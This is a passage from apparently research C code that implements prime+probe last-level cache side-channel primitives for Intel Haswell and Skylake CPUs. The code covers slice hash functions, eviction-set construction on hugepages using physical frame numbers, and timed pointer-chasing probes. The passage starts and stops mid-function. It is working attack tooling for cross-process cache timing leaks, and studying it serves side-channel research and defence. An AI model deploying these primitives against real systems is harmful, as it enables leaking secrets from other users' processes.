    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    tt = end - begin;
    if (max < tt) max = tt;
    printf("%lu\n", end-begin);
    */
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    //tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
    //printf("%lu\n", end-begin);
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    return (end-begin);//-(end2-begin2);
    //return max;
}





// Haswell i7-4600 


int haswell_i7_4600m_cache_slice_from_virt(void* addr) {
    unsigned long int x = ((unsigned long int*)addr)[0];
    return haswell_i7_4600m_cache_slice_alg((void*)(get_pfn(addr) << 12));
}

int haswell_i7_4600m_cache_slice_alg(void* addr) {
    //printf("haswell_i7_4600m_cache_slice\n");
    //unsigned long int x = ((unsigned long int*)addr)[0];
    //unsigned long int i_addr = (unsigned long int) get_pfn(addr);
    
    printf("\n%016p : \n", (void *) addr);

    unsigned long int i_addr = (unsigned long int) addr;


    // According to Reverse Engineering Intel Last-Level Cache Complex Addressing Using Performace Counters
    // Xeon & Core (4 core - from bit 17 and above)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32) ^ ((i_addr & 0x200000000) >> 33);

    return bit0;
}


// Ivy Bridge i7-3770 FUNCTIONS
    
int haswell_i7_4600m_setup(unsigned long int monline) {
    //printf("haswell_i7_4600m_setup\n");
    unsigned long int cache_line_check_offset = monline & 0x00001FFFF;  // 0001 1111 1111 1111 1111
    printPtr2bin((void *)cache_line_check_offset);
    size_t mem_length = (size_t)MB(2); 
    unsigned long int x = 0;
    int i = 0;
    //int mem_length_char = ((int)mem_length/sizeof(char));
    //int mem_length_ptr = (int)mem_length/sizeof(void *);

// Cache slice selection algorithm needs verification
// p17 ⊕ p18 ⊕ p20 ⊕ p22 ⊕ p24 ⊕ p25 ⊕ p26 ⊕ p27 ⊕ p28 ⊕ p30 ⊕ p32
// p18 ⊕ p19 ⊕ p21 ⊕ p23 ⊕ p25 ⊕ p27 ⊕ p29 ⊕ p30 ⊕ p31 ⊕ p32

    int monline_cache_slice = haswell_i7_4600m_cache_slice_alg((void *) monline);
    printf("monline_cache_slice\t:\t%d\n", monline_cache_slice);

    void *tmp[128];
    int B_idx = -1;
    int C_idx = -1;
    int D_idx = -1;
    int E_idx = -1;

    int cache_slice_pattern[4][4];

    cache_slice_pattern[0][0] = 0x0;
    cache_slice_pattern[0][1] = 0x7;
    cache_slice_pattern[0][2] = 0x9;
    cache_slice_pattern[0][3] = 0xe;

    cache_slice_pattern[1][0] = 0x1;
    cache_slice_pattern[1][1] = 0x6;
    cache_slice_pattern[1][2] = 0x8;
    cache_slice_pattern[1][3] = 0xf;

    cache_slice_pattern[2][0] = 0x2;
    cache_slice_pattern[2][1] = 0x5;
    cache_slice_pattern[2][2] = 0xb;
    cache_slice_pattern[2][3] = 0xc;

    cache_slice_pattern[3][0] = 0x3;
    cache_slice_pattern[3][1] = 0x4;
    cache_slice_pattern[3][2] = 0xa;
    cache_slice_pattern[3][3] = 0xd;


    for (i = 0; i < 128; ++i) tmp[i] = NULL;

    for (i = 0; i < 128; ++i) {
        tmp[i] = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
        printf("haswell_i7_4600m_cache_slice_from_virt(tmp[i])\t:\t%d\n", haswell_i7_4600m_cache_slice_from_virt(tmp[i]));
        //x += (unsigned long int)(*((unsigned int)tmp[i]));
        if (haswell_i7_4600m_cache_slice_from_virt(tmp[i]) == 0) {     //monline_cache_slice
            if (B_idx == -1) {
                B = tmp[i];
                B_idx = i;
                continue;
            }
            if (C_idx == -1) {
                C = tmp[i];
                C_idx = i;
                continue;
            }
            if (D_idx == -1) {
                D = tmp[i];
                D_idx = i;
                continue;
            }
            if (E_idx == -1) {
                E = tmp[i];
                E_idx = i;
                break;
            }
        }
    }
    
    printf("B_idx\t:\t%d\n", B_idx);
    printf("C_idx\t:\t%d\n", C_idx);
    printf("D_idx\t:\t%d\n", D_idx);
    printf("E_idx\t:\t%d\n", E_idx);

    if (B_idx == -1 || C_idx == -1 || D_idx == -1 || E_idx == -1) return 0;

    // THIS FOR LOOP NEEDS REVISION (is munmap((void *) addr, size_t length) relieasing the hugepage as expected?)
    for (i = 0; i < 128; ++i) {
        //printf("i\t:\t%d\n", i);
        if (i != B_idx && i != C_idx && i != D_idx && i != E_idx && tmp[i] != NULL) {
            munmap(tmp[i], MB(2));
        }
    }



    //B = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
    //C = mmap(NULL, mem_length, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    // check if memory was properly allocated

    x += (unsigned long int)B[MB(0)];
    x += (unsigned long int)C[MB(0)];
    x += (unsigned long int)D[MB(0)];
    x += (unsigned long int)E[MB(0)];

    //printf("B : %p\n", (void *)get_pfn(B));
    //printf("C : %p\n", (void *)get_pfn(C));


    B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);

    E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8);
    E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8);




    if ( ((cache_slice_pattern[monline_cache_slice][3] << 17) + cache_line_check_offset + KB(32)) < MB(2) ) {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 + KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8);


        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 + KB(32)/8;
    } else {
        B[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        B[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        C[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(C + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        C[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        D[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(D + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        D[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        E[(cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][1] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][2] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(E + (cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);
        E[(cache_slice_pattern[monline_cache_slice][3] << 17)/8 + cache_line_check_offset/8 - KB(32)/8] = (volatile char *)(B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8);

        init_reprime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8 - KB(32)/8;
    }


    init_prime = B + (cache_slice_pattern[monline_cache_slice][0] << 17)/8 + cache_line_check_offset/8;
    

    return 1;
}

void haswell_i7_4600m_prime() {
    //printf("ivybridge_i7_3770_prime\n");
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    volatile char **tmp1 = init_prime;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
    tmp1 = (volatile char **)*tmp1;
    //printf("%d : ", haswell_i7_4600m_cache_slice_from_virt((void*)tmp1));
    //printPtr2bin((void*)(get_pfn((void*)tmp1) << 12));
    //printPtr2bin((void*)tmp1);
}

void haswell_i7_4600m_reprime() {
    //printf("haswell_i7_4600m_reprime\n");
    volatile char **tmp1 = init_reprime;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
}

unsigned long int haswell_i7_4600m_probe() {
    //printf("haswell_i7_4600m_probe\n");
    // PROBE & MEASURE
    unsigned long int begin, end;
    //unsigned long int begin2, end2;
    volatile char **tmp1 = init_prime;
    TIMESTAMP_START;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    tmp1 = (volatile char **)*tmp1;
    TIMESTAMP_STOP;
    begin = get_global_timestamp_start();
    end = get_global_timestamp_stop();
/*
    TIMESTAMP_START;
    TIMESTAMP_STOP;
    begin2 = get_global_timestamp_start();
    end2 = get_global_timestamp_stop();
*/
    return (end-begin);//-(end2-begin2);
}



// Skylake i7-6700

int skylake_i7_6700_cache_slice_from_virt(void* addr) {
    unsigned long int x = ((unsigned long int*)addr)[0];
    return skylake_i7_6700_cache_slice_alg((void*)(get_pfn(addr) << 12));
}

int skylake_i7_6700_cache_slice_alg(void* addr) {
    //printf("skylake_i7_6700_cache_slice\n");
    //unsigned long int x = ((unsigned long int*)addr)[0];
    //unsigned long int i_addr = (unsigned long int) get_pfn(addr);
    
    //printf("\n%016p : \n", (void *) addr);

    unsigned long int i_addr = (unsigned long int) addr;

/*
    printf("vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv\n");
    printPtr2bin((void *) addr);
    printf("17:%lu 18:%lu 20:%lu 22:%lu 24:%lu 25:%lu 26:%lu 27:%lu 28:%lu 30:%lu 32:%lu\n", ((i_addr & 0x000020000) >> 17), ((i_addr & 0x000040000) >> 18), 
                ((i_addr & 0x000100000) >> 20), ((i_addr & 0x000400000) >> 22), ((i_addr & 0x001000000) >> 24), ((i_addr & 0x002000000) >> 25),
                ((i_addr & 0x004000000) >> 26), ((i_addr & 0x008000000) >> 27), ((i_addr & 0x010000000) >> 28), ((i_addr & 0x040000000) >> 30), 
                ((i_addr & 0x100000000) >> 32));
    printf("18:%lu 19:%lu 21:%lu 23:%lu 25:%lu 27:%lu 29:%lu 30:%lu 31:%lu 32:%lu\n", ((i_addr & 0x000040000) >> 18), ((i_addr & 0x000080000) >> 19), 
                ((i_addr & 0x000200000) >> 21), ((i_addr & 0x000800000) >> 23), ((i_addr & 0x002000000) >> 25), ((i_addr & 0x008000000) >> 27), 
                ((i_addr & 0x020000000) >> 29), ((i_addr & 0x040000000) >> 30), ((i_addr & 0x080000000) >> 31), ((i_addr & 0x100000000) >> 32));
    printf("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n");
*/

/*
    // According to Systematic Reverse Engineering of Cache Slice Selection in Intel Processors
    // Intel i7-4702M Haswell (4 cores)
    // Intel Xeon E5-2609 v2 Ivy Bridge (4 cores)
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32);

    int bit1 = ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000200000) >> 21) ^ ((i_addr & 0x000800000) >> 23) 
             ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x008000000) >> 27) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x040000000) >> 30) 
             ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x100000000) >> 32);
*/

    // According to Reverse Engineering Intel Last-Level Cache Complex Addressing Using Performace Counters
    // Xeon & Core (4 core - from bit 17 and above)
//    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000400000) >> 22) 
//             ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x004000000) >> 26) ^ ((i_addr & 0x008000000) >> 27) 
//             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x040000000) >> 30) ^ ((i_addr & 0x100000000) >> 32) ^ ((i_addr & 0x200000000) >> 33);

//    int bit1 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000200000) >> 21)
//             ^ ((i_addr & 0x000400000) >> 22) ^ ((i_addr & 0x000800000) >> 23) ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x004000000) >> 26) 
//             ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x200000000) >> 33)
//             ^ ((i_addr & 0x400000000) >> 34);


//    return ((bit1 << 1) | bit0);

    // Label Bit 0
    // Solution 1
    int bit0 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000100000) >> 20)
             ^ ((i_addr & 0x000800000) >> 23) ^ ((i_addr & 0x001000000) >> 24) ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x010000000) >> 28)
             ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x100000000) >> 32);

    // Solution 2
    int bit1 = ((i_addr & 0x000020000) >> 17) ^ ((i_addr & 0x000100000) >> 20) ^ ((i_addr & 0x000200000) >> 21) ^ ((i_addr & 0x001000000) >> 24)
             ^ ((i_addr & 0x008000000) >> 27) ^ ((i_addr & 0x010000000) >> 28) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x040000000) >> 30);

    // Solution 3
    int bit2 = ((i_addr & 0x000040000) >> 18) ^ ((i_addr & 0x000080000) >> 19) ^ ((i_addr & 0x000200000) >> 21) ^ ((i_addr & 0x000800000) >> 23)
             ^ ((i_addr & 0x002000000) >> 25) ^ ((i_addr & 0x008000000) >> 27) ^ ((i_addr & 0x020000000) >> 29) ^ ((i_addr & 0x040000000) >> 30)
             ^ ((i_addr & 0x080000000) >> 31) ^ ((i_addr & 0x100000000) >> 32);


    // Label Bit 1
    // Solution 1
